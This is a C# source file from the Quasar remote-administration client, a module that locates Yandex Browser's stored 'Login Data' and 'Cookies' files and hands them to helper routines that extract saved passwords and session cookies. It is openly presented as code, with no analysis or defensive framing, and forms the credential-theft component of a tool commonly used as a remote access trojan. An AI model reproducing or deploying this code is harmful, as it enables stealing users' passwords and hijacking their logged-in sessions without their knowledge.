using System;
using System.Collections.Generic;
using System.IO;
using Quasar.Client.Recovery.Utilities;
using Quasar.Common.Models;

namespace Quasar.Client.Recovery.Browsers
{
    public class Yandex
    {
        public static List<RecoveredAccount> GetSavedPasswords()
        {
            try
            {
                string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Yandex\\YandexBrowser\\User Data\\Default\\Login Data");
                return ChromiumBase.Passwords(datapath, "Yandex");
            }
            catch (Exception)
            {
                return new List<RecoveredAccount>();
            }
        }
        public static List<ChromiumBase.ChromiumCookie> GetSavedCookies()
        {
            try
            {
                string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Yandex\\YandexBrowser\\User Data\\Default\\Cookies");
                return ChromiumBase.Cookies(datapath, "Yandex");
            }
            catch (Exception)
            {
                return new List<ChromiumBase.ChromiumCookie>();
            }
        }

    }
}
